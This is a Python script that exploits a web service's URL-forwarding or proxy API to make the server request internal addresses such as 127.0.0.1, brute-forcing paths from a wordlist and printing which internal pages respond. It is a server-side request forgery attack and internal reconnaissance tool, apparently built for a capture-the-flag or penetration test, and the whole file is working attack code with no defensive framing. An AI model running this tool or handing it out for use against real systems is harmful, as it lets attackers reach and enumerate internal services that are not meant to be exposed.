import argparse
import requests
import time
import concurrent.futures





def count_words(wordlist_a):
    with open(wordlist_a, 'r') as fp:
        for count, line in enumerate(fp):
            pass
    return count


def internal_request(internal_link, corresponding_req):
    print("Internal Request: {}".format(internal_link.rstrip()))
    response = requests.get(internal_link.rstrip())
    print("Response: {}\n".format(response.status_code))
    if response.status_code == 200:
        res_tuple = (str(internal_link[internal_link.rindex('/') + 1:]), len(response.text), corresponding_req)
        return res_tuple


def test_request(urltarget, dynamic_section, internal, word, index, sleep=0):
    #for seclists
    if word[0] == '#':
        return
    if word[0] == '\n':
        word = ''
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(urltarget + dynamic_section + str(index), json={
        "forward_url": internal + word.rstrip(), "proxy_response": True, "insecure_tls": False,
        "expand_path": True, "capacity": 1000
    }, headers = headers )
    corresponding_req = urltarget.rsplit('/', urltarget.count('/') - 2)[0] + '/' + dynamic_section + str(index)
    if response.status_code == 201:
        temp = internal_request(urltarget.rsplit('/', urltarget.count('/') - 2)[0] + '/' + dynamic_section + str(index), corresponding_req)
        if temp is None:
            return
        else:
            results.append(temp)
    time.sleep(sleep)


def api_request(urltarget, dynamic_section, wordlist_f, ms, internal):
    with open(wordlist_f, 'r') as fp:
        with concurrent.futures.ThreadPoolExecutor() as executioner:
            futures = []
            for count, word in enumerate(fp):
                futures.append(executioner.submit(test_request, urltarget=urltarget, dynamic_section=dynamic_section,
                                              internal=internal, word=word, index=count, sleep=ms))


def parse_it():
    parser = argparse.ArgumentParser(description='Wordlist, url_link, ms')
    parser.add_argument('-w', type=str, help='Wordlist file', required=True)
    parser.add_argument('-target', type=str,
                        help='The static section of the url EX:) ~>http://target.com/<~your_created_link',
                        required=True)
    parser.add_argument('-dynamic', type=str,
                        help='The dynamic section of the url EX:) http://target.com/~>your_created_link<~', required=True)
    parser.add_argument('-m', type=int, help='ms per request')
    parser.add_argument('-internal_target', type=str,
                        help='The internal web server address EX:) http://127.0.0.1/path/leading/to/search/', required=True)
    args = parser.parse_args()
    return args.w, args.target, args.dynamic, args.m, args.internal_target


if __name__ == '__main__':
    wordlist, target, dynamic, ms, internal_target = parse_it()
    results = []
    api_request(target, dynamic, wordlist, ms, internal_target)
    for i in results:
        print("Page Link: {}\nContent Length:{}\nRequest to reach the URL:{}".format(str(i[0]), str(i[1]), str(i[2])))
